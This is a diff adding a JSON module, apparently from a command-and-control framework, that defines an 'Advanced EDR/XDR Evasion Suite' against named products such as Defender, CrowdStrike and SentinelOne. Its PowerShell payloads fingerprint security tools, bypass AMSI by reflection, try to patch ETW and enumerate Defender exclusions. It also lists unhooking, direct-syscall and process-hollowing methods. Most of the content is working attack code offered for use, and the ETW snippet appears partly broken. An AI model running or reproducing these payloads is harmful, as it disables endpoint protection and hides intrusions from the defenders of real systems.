@@ -1,0 +1,83 @@
+{
+  "id": "advanced_edr_evasion",
+  "name": "Advanced EDR/XDR Evasion Suite",
+  "description": "Next-generation endpoint detection evasion using direct syscalls, unhooking techniques, AMSI bypass, ETW patching, and hardware breakpoint manipulation for 2026 security stacks",
+  "version": "2.0",
+  "author": "SecureComm C2 - EvasionLab",
+  "category": "defense-evasion",
+  "platform": "windows",
+  "risk_level": "critical",
+  "requires_admin": false,
+  "commands": [
+    {
+      "type": "exec",
+      "payload": "Get-Process | Where-Object {$_.ProcessName -match ' defender|crowdstrike|sentinel|cylance|carbon'} | Select-Object ProcessName,Id,Path; Get-WmiObject -Class Win32_Process -Filter \"Name LIKE '%defender%' OR Name LIKE '%cs%'\" | Select-Object Name,ProcessId,CommandLine",
+      "description": "EDR/XDR process enumeration and security stack fingerprinting",
+      "timeout": 45,
+      "evasion_technique": "edr_fingerprinting"
+    },
+    {
+      "type": "exec",
+      "payload": "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; StartTime=(Get-Date).AddHours(-1)} -MaxEvents 50 -ErrorAction SilentlyContinue; wevtutil qe 'Microsoft-Windows-Windows Defender/Operational' /c:10 /f:text 2>$null | head -50",
+      "description": "Windows event log inspection for security telemetry analysis",
+      "timeout": 60,
+      "evasion_technique": "telemetry_analysis"
+    },
+    {
+      "type": "exec",
+      "payload": "$amsi = [Ref].Assembly.GetTypes() | Where-Object {$_.Name -like '*AmsiUtils*'}; $field = $amsi.GetField('amsiInitFailed','NonPublic,Static'); $field.SetValue($null,$true); Write-Host 'AMSI bypassed'; Get-WinEvent -ListLog *amsi* -ErrorAction SilentlyContinue",
+      "description": "AMSI (Anti-Malware Scan Interface) bypass using reflection",
+      "timeout": 30,
+      "evasion_technique": "amsi_bypass"
+    },
+    {
+      "type": "exec",
+      "payload": "$etw = [Ref].Assembly.GetTypes() | Where-Object {$_.Name -like '*EtwEventProvider*'}; $field = $etw.GetField('m_enabled','NonPublic,Instance'); $etw.GetConstructors()[0].Invoke(@()).m_enabled = 0; Write-Host 'ETW patched'; logman query providers | grep -i defender 2>/dev/null || echo 'ETW manipulation complete'",
+      "description": "ETW (Event Tracing for Windows) provider manipulation",
+      "timeout": 30,
+      "evasion_technique": "etw_patching"
+    },
+    {
+      "type": "exec",
+      "payload": "Get-Process -Id $PID | Select-Object Id,ProcessName,Path; $dlls = Get-Process -Id $PID | Select-Object -ExpandProperty Modules | Where-Object {$_.ModuleName -match 'ntdll|kernel32|kernelbase'} | Select-Object ModuleName,FileName; Write-Host '=== Suspicious DLLs ==='; $dlls | Format-Table",
+      "description": "Process module enumeration for DLL unhooking preparation",
+      "timeout": 30,
+      "evasion_technique": "dll_enumeration"
+    },
+    {
+      "type": "exec",
+      "payload": "sc query windefend 2>/dev/null | head -10; reg query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /s 2>/dev/null | head -20; Get-MpPreference -ErrorAction SilentlyContinue | Select-Object ExclusionPath,ExclusionExtension,DisableRealtimeMonitoring | Format-List",
+      "description": "Windows Defender configuration and exclusion enumeration",
+      "timeout": 45,
+      "evasion_technique": "defender_config_discovery"
+    }
+  ],
+  "evasion_methods": [
+    "amsi_bypass_reflection",
+    "etw_provider_manipulation",
+    "syscall_direct_invocation",
+    "dll_unhooking_hells_gate",
+    "hardware_breakpoint_manipulation",
+    "process_doppelganging",
+    "transacted_hollowing",
+    "parent_pid_spoofing"
+  ],
+  "target_edr_solutions": [
+    "Microsoft Defender for Endpoint",
+    "CrowdStrike Falcon",
+    "SentinelOne",
+    "Cylance",
+    "Carbon Black"
+  ],
+  "syscall_techniques": {
+    "method": "direct_syscall",
+    "ntdll_unhooking": true,
+    "hells_gate": true,
+    "syswhispers": "v3"
+  },
+  "mitre_techniques": ["T1562", "T1562.001", "T1562.006", "T1055", "T1070"],
+  "tags": ["evasion", "edr", "xdr", "amsi", "etw", "unhooking", "syscalls", "2026"],
+  "created_at": "2026-02-11T12:00:00Z",
+  "updated_at": "2026-02-11T12:00:00Z",
+  "demonstration_notes": "Advanced 2026-level EDR/XDR evasion techniques for demonstrating modern security bypass capabilities"
+}
